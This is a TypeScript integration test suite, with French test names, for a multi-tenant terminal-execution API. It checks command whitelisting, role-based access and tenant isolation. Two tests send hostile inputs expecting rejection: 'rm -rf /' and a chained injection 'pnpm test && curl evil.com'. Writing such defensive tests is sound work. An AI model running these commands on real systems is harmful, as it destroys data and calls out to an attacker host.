import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { createApiServer } from '../src/server.js';
import { projectStore } from '../../../packages/core/src/identity/project.js';

interface TerminalExecuteResponse {
  result: {
    tenantId: string;
    projectId: string;
    command: string;
    binary: string;
    exitCode: number;
    stdout: string;
    stderr: string;
    durationMs: number;
  };
  requestId: string;
}

describe('CORE-005 : Terminal API Integration Tests', () => {
  let server: Server;
  let baseUrl: string;
  const tenantId = 'tenant_term_api_01';
  let projectId: string;

  before(async () => {
    projectStore.clear();
    const proj = projectStore.createProject(tenantId, 'Terminal Integration App');
    projectId = proj.id;

    const instance = createApiServer({ port: 0 });
    server = instance.server;
    await new Promise<void>((resolve) => {
      server.listen(0, () => {
        const address = server.address() as AddressInfo;
        baseUrl = `http://127.0.0.1:${address.port}`;
        resolve();
      });
    });
  });

  after(async () => {
    projectStore.clear();
    await new Promise<void>((resolve) => {
      server.close(() => resolve());
    });
  });

  it('doit exécuter réellement une commande indépendante du projet (ex: node --version) via l API', async () => {
    const res = await fetch(`${baseUrl}/api/v1/projects/${projectId}/terminal/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-tenant-id': tenantId,
        'x-user-role': 'ENGINEER'
      },
      body: JSON.stringify({
        command: 'node --version'
      })
    });

    assert.equal(res.status, 200);
    const body = (await res.json()) as TerminalExecuteResponse;
    assert.equal(body.result.exitCode, 0);
    assert.equal(body.result.binary, 'node');
    assert.match(body.result.stdout.trim(), /^v\d+\.\d+\.\d+/);
    assert.ok(res.headers.has('x-request-id'));
  });

  it('doit refuser les commandes hors whitelist (400 Bad Request)', async () => {
    const res = await fetch(`${baseUrl}/api/v1/projects/${projectId}/terminal/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-tenant-id': tenantId,
        'x-user-role': 'ENGINEER'
      },
      body: JSON.stringify({
        command: 'rm -rf /'
      })
    });

    assert.equal(res.status, 400);
  });

  it('doit refuser les tentatives d injection shell (400 Bad Request)', async () => {
    const res = await fetch(`${baseUrl}/api/v1/projects/${projectId}/terminal/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-tenant-id': tenantId,
        'x-user-role': 'ENGINEER'
      },
      body: JSON.stringify({
        command: 'pnpm test && curl evil.com'
      })
    });

    assert.equal(res.status, 400);
  });

  it('doit interdire l exécution de commande au rôle VIEWER (403 Forbidden)', async () => {
    const res = await fetch(`${baseUrl}/api/v1/projects/${projectId}/terminal/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-tenant-id': tenantId,
        'x-user-role': 'VIEWER'
      },
      body: JSON.stringify({
        command: 'pnpm test'
      })
    });

    assert.equal(res.status, 403);
  });

  it('doit respecter l herméticité multi-tenant (404 Not Found)', async () => {
    const res = await fetch(`${baseUrl}/api/v1/projects/${projectId}/terminal/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-tenant-id': 'tenant_inconnu',
        'x-user-role': 'ENGINEER'
      },
      body: JSON.stringify({
        command: 'git status'
      })
    });

    assert.equal(res.status, 404);
  });
});
